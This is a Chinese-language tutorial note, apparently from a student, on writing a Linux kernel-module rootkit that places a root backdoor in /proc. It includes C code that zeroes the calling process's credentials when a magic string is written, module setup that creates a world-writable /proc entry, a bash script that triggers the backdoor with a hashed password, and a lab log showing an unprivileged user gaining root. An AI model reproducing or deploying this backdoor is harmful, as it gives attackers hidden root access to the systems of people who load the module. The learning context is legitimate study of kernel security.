## 提供root后门
本资料的思路是在/proc之中提供一个文件，如果某个进程向该文件写入特定内容，则让模块赋进程的uid和euid为0。

那么，如何在内核模块中创建/proc下面的文件?

采用`proc_create`与`proc_remove`？查阅了一下这两个函数至少在5.4.81版本中他们是存在的。

查阅一下这两个函数的基本信息，在原项目中已经详细给出，这里稍作补充，第二个例子尤其好：

https://stackoverflow.com/questions/8516021/proc-create-example-for-kernel-module

https://devarea.com/linux-kernel-development-creating-a-proc-file-and-interfacing-with-user-space/#.Y0K-JHZBxD8

这则post解释了proc_create的参数选取：
https://stackoverflow.com/questions/28664971/why-is-does-proc-create-mode-argument-0-correspond-to-0444

mode选取采用了UGO策略，望周知。

我们尝试按照文章内的思路实现一个拥有后门的玩具。

## 后门的安置：
如README.md所示参考的文档所述，可以通过修改用户id为root的id实现用户的提权。我们来看一下先前全志设置下来的源代码：
```C
    if(!strncmp("rootmydevice",(char*)buf,12)){
		cred = (struct cred *)__task_cred(current);
		cred->uid = 0;
		cred->gid = 0;
		cred->suid = 0;
		cred->euid = 0;
		cred->euid = 0;
		cred->egid = 0;
		cred->fsuid = 0;
		cred->fsgid = 0;
		printk("now you are root\n");
	}
```
可以看到咱们利用了数据结构cred，这个数据结构的详细结构如下面的链接所示：

https://github.com/torvalds/linux/blob/master/include/linux/cred.h

对于函数__task_cred的解释，则为：Access a task's objective credentials

因此，直接对当前进程（current）套用该函数是可行的。

```C
void backdoor(void) {
    entry = proc_create(NAME, S_IRUGO | S_IWUGO, NULL, &proc_fops);
}

void cleanbackdoor(void) {
    proc_remove(entry);
}

static int __init mode_init(void) {
    printk(KERN_INFO "Rootkit is entering.\n");
    backdoor();
    return 0;
}

static void __exit mode_exit(void) {
    cleanbackdoor();
    printk(KERN_INFO "Rootkit is leaving.\n");
}
```
函数的整体逻辑如上所示：该函数利用backdoor函数和cleanbackdoor函数的组合，在insmod该模块时提供了一个后门文件，NAME表示的是创建的后门文件的路径（当然proc_create会把该文件置于/proc/下）。

创建好这个文件后，需撰写write_handler，表示如果有人向该文件写入某些字符该内核模块应该执行怎样的操作，我们看到在write_handler内部（这里就不赘述，参考原文档）验证了字符串是否是我们设置的想要的后门值，以此确定是否给输入该字符串进入文件的用户提权。
## 脚本
```shell
#!/usr/bin/env bash


# The testing script for the root backdoor functionality.


sha512() {
    printf '%s' "${1}" | sha512sum | cut -d ' ' -f1
}


id && \
    file /proc/kcore # We can't read because we are not root.

printf '%s' a_wrong_try > /proc/$(sha512 rootme) && \
    printf '%s' $(sha512 r00tme) > /proc/$(sha512 rootme) && \
    id && \
    file /proc/kcore # We can read we are now root!
```
这里的脚本内容是现学的，可以参考这个资料，过了一半感觉还可以的：

https://www.shellscript.sh/

总之，id会告诉当前用户的一些基本用户id和group id之类的信息，file命令会查看接下来跟着的文件的类型（当然，/proc/kcore只有在拿到root权限后才可以看）。该脚本定义了一个叫做sha512的函数，具体来说该函数会根据输入给他的参数（参考链接：https://www.shellscript.sh/variables2.html）来利用sha512进行散列化，并截断（cut命令）使之维持同等长度。

特别的，第一次我们将"a_wrong_try"这个字符串送到名为/proc/$(sha512 rootme)的文件夹内（sha512 rootme表示以rootme作为参数进行散列化），这当然是不可以的。原函数设置好仅在输入r00tme的散列值才能提权成为root（具体参考write_handler里的参数设置，也可以自行撰写命令行计算验证一下，很简单的）。因此，第二个printf函数送进去的参数会使得当前用户升级为root。

为了验证这一点，我们看一些id的信息，并看一下自己是否有权利访问/proc/kcore，结果发现是可行的，说明提权完成了。（参考实验记录）

那么，我们的提权工作就讲到这里结束。
## 实验记录
```
root@ubuntu:/home/link/Desktop/libreCrops# insmod backdoor.ko
root@ubuntu:/home/link/Desktop/libreCrops# useradd annon
root@ubuntu:/home/link/Desktop/libreCrops# su annon
$ ./rootme.sh
uid=1001(annon) gid=1001(annon) groups=1001(annon)
/proc/kcore: regular file, no read permission
uid=0(root) gid=0(root) groups=0(root),1001(annon)
/proc/kcore: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from 'BOOT_IMAGE=/boot/vmlinuz-5.4.0-81-generic root=UUID=1628dcf5-3fb1-49e0-a3f6-e03'
$ exit
root@ubuntu:/home/link/Desktop/libreCrops# userdel annon
root@ubuntu:/home/link/Desktop/libreCrops# rmmod backdoor.ko
root@ubuntu:/home/link/Desktop/libreCrops# dmesg
[ 1283.115726] Rootkit is entering.
[ 1297.012164] Alien, get out of here: a_wrong_try.
[ 1297.014952] Comrade, I will help you.
[ 1297.014952] See you!
[ 1321.659761] Rootkit is leaving.
root@ubuntu:/home/link/Desktop/libreCrops# 
```
